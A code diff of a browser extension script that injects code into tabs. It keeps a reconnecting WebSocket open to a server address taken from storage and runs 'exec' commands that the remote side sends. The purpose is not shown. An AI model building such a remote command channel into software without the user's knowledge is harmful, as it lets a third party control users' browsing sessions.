@@ -1,5 +1,5 @@
 (() => {
-  const local = () => async () => {
+  async function local() {
     window.storageLocal = chrome.storage.local
     window.storageSync = chrome.storage.sync
     const { url, uuid } = await storageLocal.get()
@@ -65,22 +65,31 @@
     window.storageSync = chrome.storage.sync
     const { uuid, socketUrl } = await storageLocal.get()
     const deviceId = uuid?.replace(/&/g, '') || navigator.platform || navigator.userAgentData?.platform || 'Unknown'
-    const ws = new WebSocket(socketUrl)
-    
+    let ws
+    initSocket()
+
     storageLocal.set({ uuid: deviceId })
-    
-    ws.emit = (action, data) => ws.send(JSON.stringify({ action, payload: data }))
-    ws.onopen = (e) => {
-      ws.onmessage = ({ data }) => {
-        // console.log(JSON.parse(data))
-        const { action, from, payload } = JSON.parse(data)
-        wk.remoteId = from
-        switch (action) {
-          case 'HI':
-            ws.send(JSON.stringify({ action: 'ID', payload: `${deviceId}-${tabId}` }))
-            break
-          case 'exec': wk.exec(payload.name, payload.args)
-            break
+
+    function initSocket() {
+      ws = new WebSocket(socketUrl)
+      ws.emit = (action, data) => ws.send(JSON.stringify({ action, payload: data }))
+      ws.onopen = (e) => {
+        ws.onmessage = ({ data }) => {
+          // console.log(JSON.parse(data))
+          const { action, from, payload } = JSON.parse(data)
+          wk.remoteId = from
+          wk.action
+          switch (action) {
+            case 'HI':
+              ws.send(JSON.stringify({ action: 'ID', payload: `${deviceId}-${tabId}` }))
+              break
+            case 'exec': wk.exec(payload.name, payload.args)
+              break
+          }
+        }
+        ws.onclose = () => {
+          ws.onclose = null
+          setTimeout(initSocket, 2000)
         }
       }
     }
@@ -249,7 +258,7 @@
 
       setTimeout(() => chrome.scripting.executeScript({
         target: { tabId },
-        function: local()
+        function: local
       }), 500)
     }
   })
